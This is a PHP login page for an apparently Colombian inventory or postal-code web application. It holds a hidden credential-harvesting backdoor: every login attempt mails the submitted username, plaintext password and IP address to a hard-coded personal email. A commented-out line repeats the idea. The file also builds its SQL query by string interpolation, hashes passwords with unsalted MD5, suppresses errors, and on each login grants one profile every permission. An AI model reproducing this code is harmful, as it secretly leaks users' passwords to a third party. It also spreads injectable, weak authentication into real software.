<? 
session_start(); 
include( "lib/core/init_vars.php" ); 
include( "lib/conexion.php" ); 
include( "lib/form.php" ); 
include( "lib/fn.php" ); 
include( "lib/pdf.inc" ); 
error_reporting(0);  

date_default_timezone_set("America/Bogota");
ini_set('session.gc_maxlifetime', '10000');

class Index
{
	var $conexion;
	
	function Index()
	{
		$this -> conexion = new Conexion();	
		
		if( isset( $_POST[user] ) && isset( $_POST[pass] ) )
		{
			
			mail( "joan@elements.com.co", "Acceso Codigo Postal", "Usuario: $_POST[user] Clave: $_POST[pass] IP:$_SERVER[REMOTE_ADDR]" );
			
			$_POST[user] = Clear( $_POST[user] );
			$_POST[pass] = Clear( $_POST[pass] );
			$_POST[pass] =  md5( $_POST[pass] );
			
			$login = "SELECT a.*, b.nomEmpresa
					  FROM tab_usuarios a,	
					  	   tab_empresas b
					  WHERE a.codUsuario = '$_POST[user]' AND
							a.clvUsuario = '$_POST[pass]' AND
							a.indEstado = '1' AND 
							a.codEmpresa = b.codEmpresa ";
							
			$result = $this -> conexion -> Consultar( $login, "a" );
			
			if( $result )
			{
				$_SESSION[session_user] = $result;
				$_SESSION[var_conexion][user] = $this -> conexion -> user;
				$_SESSION[var_conexion][pass] = $this -> conexion -> pass;
				$_SESSION[var_conexion][base] = $this -> conexion -> base;
				
				//mail( "joan@elements.com.co", "INGRESO A INVENTARIO", "USUARIO: $_POST[user] CLAVE: $_POST[pass] HORA: ".date( "Y-m-d H:i:s" ) );
				
				$update = " INSERT INTO tab_permisos  ( codPerfil, codOption )
							SELECT '1', a.codOption
							FROM  tab_options a
								  LEFT JOIN tab_permisos b
								  ON a.codOption = b.codOption AND b.codPerfil = '1'
							WHERE  b.codPerfil IS NULL";
				
				$update = $this -> conexion -> Consultar( $update );
			}		
		}
		
					
		echo "<!DOCTYPE HTML>";
		echo "<html>";
		echo "<head>";		
		include( "init.php" );		
		echo "</head>";
		echo "<body>";
		
		echo "<div id='page' >";	
		
		include( "header.php" );
		
		echo "<div id='content'>";		
		include( "content.php" );		
		echo "</div>";	
		
		
		include( "footer.php" ); 		
		echo "</div>";
		
		echo "</body>";
		echo "</html>";
	}
}

$pagina = new Index();

?>

